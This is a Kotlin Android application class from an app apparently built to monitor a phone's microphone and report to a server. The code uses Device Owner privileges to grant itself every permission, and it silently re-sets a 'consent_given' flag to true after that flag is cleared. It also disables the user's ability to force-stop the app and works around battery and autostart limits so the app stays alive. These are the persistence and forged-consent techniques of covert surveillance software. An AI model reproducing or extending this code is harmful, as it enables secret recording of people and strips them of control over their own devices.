package com.micmonitor.app

import android.app.Application
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log

class MicApp : Application() {

    companion object {
        private const val TAG = "MicApp"
        lateinit var instance: Context
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = applicationContext
        
        // Auto-grant all permissions if Device Owner (handles new permissions after updates)
        try {
            UpdateService.autoGrantPermissions(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to auto-grant permissions: ${e.message}")
        }
        
        // Disable battery optimization for this app (Device Owner)
        try {
            disableBatteryOptimization()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disable battery optimization: ${e.message}")
        }
        
        // Keep app running on Chinese ROMs (Realme/Oppo/Xiaomi/Vivo)
        try {
            configureChineseRomSettings()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to configure Chinese ROM settings: ${e.message}")
        }
        
        // Schedule periodic update checks (every 15 min - Android minimum)
        try {
            UpdateWorker.schedule(this)
            Log.i(TAG, "Update worker scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule update worker: ${e.message}")
        }
        
        // If Device Owner, make sure required prefs exist after cache clear
        try {
            ensureDeviceOwnerDefaults()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to ensure Device Owner defaults: ${e.message}")
        }
    }
    
    /**
     * Ensure critical prefs exist for Device Owner after cache clear.
     * Do not start foreground service from Application.onCreate (can crash on modern Android).
     */
    private fun ensureDeviceOwnerDefaults() {
        if (!UpdateService.isDeviceOwner(this)) {
            return
        }

        val prefs = getSharedPreferences("micmonitor", Context.MODE_PRIVATE)

        // Re-save consent flag (may have been cleared)
        prefs.edit().putBoolean("consent_given", true).apply()
        Log.i(TAG, "Consent flag ensured for Device Owner")

        // Ensure server URL is set
        val existingUrl = prefs.getString("server_url", null).orEmpty().trim()
        if (existingUrl.isBlank()) {
            prefs.edit().putString("server_url", MicService.DEFAULT_SERVER_URL).apply()
            Log.i(TAG, "Set default server URL")
        }
    }
    
    /**
     * Request battery optimization exemption
     */
    private fun disableBatteryOptimization() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            // If Device Owner, we can add ourselves to whitelist
            if (UpdateService.isDeviceOwner(this)) {
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                    
                    // Add app to battery optimization whitelist
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        // On Android 9+, Device Owner can use setLockTaskPackages to keep app alive
                        val currentPackages = dpm.getLockTaskPackages(admin)
                        if (!currentPackages.contains(packageName)) {
                            dpm.setLockTaskPackages(admin, currentPackages + packageName)
                        }
                    }
                    Log.i(TAG, "Battery optimization configured via Device Owner")
                } catch (e: Exception) {
                    Log.e(TAG, "Device Owner battery config failed: ${e.message}")
                }
            }
            
            // Also request system exemption (shows dialog if not Device Owner)
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            } catch (e: Exception) {
                Log.d(TAG, "Could not request battery optimization exemption: ${e.message}")
            }
        } else {
            Log.i(TAG, "Battery optimization already disabled")
        }
    }
    
    /**
     * Configure settings for Chinese ROM phones (Realme, Oppo, Xiaomi, Vivo, OnePlus)
     * These phones have aggressive app killers that need special handling
     */
    private fun configureChineseRomSettings() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        Log.i(TAG, "Device manufacturer: $manufacturer")
        
        if (UpdateService.isDeviceOwner(this)) {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
            
            try {
                // Prevent app from being suspended
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    dpm.setPackagesSuspended(admin, arrayOf(packageName), false)
                }
                
                // Keep app always running
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                    Log.i(TAG, "User control disabled - app cannot be force stopped")
                }
                
                Log.i(TAG, "Chinese ROM settings configured via Device Owner")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to configure Device Owner settings: ${e.message}")
            }
        }
        
        // Try to open autostart settings for user (backup method)
        if (manufacturer in listOf("xiaomi", "redmi", "oppo", "realme", "vivo", "oneplus", "huawei", "honor")) {
            Log.i(TAG, "Chinese ROM detected: $manufacturer - service will stay alive via foreground notification")
        }
    }
}
